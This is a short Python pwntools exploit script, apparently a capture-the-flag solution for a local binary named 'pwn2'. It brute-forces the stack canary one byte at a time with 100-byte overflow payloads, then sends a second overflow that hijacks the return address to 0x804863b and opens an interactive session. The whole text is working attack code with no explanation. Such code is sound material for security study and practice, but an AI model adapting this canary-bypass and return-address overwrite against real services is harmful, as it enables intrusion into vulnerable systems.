from pwn import *
name = "./pwn2"
p = process(name)
canary = '\x00'
p.recvuntil(b"welcome")
for i in range(3) :
    for j in range(256) :         
        payload = "a"*100 + canary + chr(j)
        p.send(payload)
        a = p.recvuntil(b"welcome\n")
        if b"recv" in a :
            print(f"Found : {hex(j)}")
            canary += chr(j)
            break
canary = u32(canary)
payload2 = b"a"*100 + p32(canary) + b"a"*12 + p32(0x804863b)
p.sendline(payload2)
p.interactive()

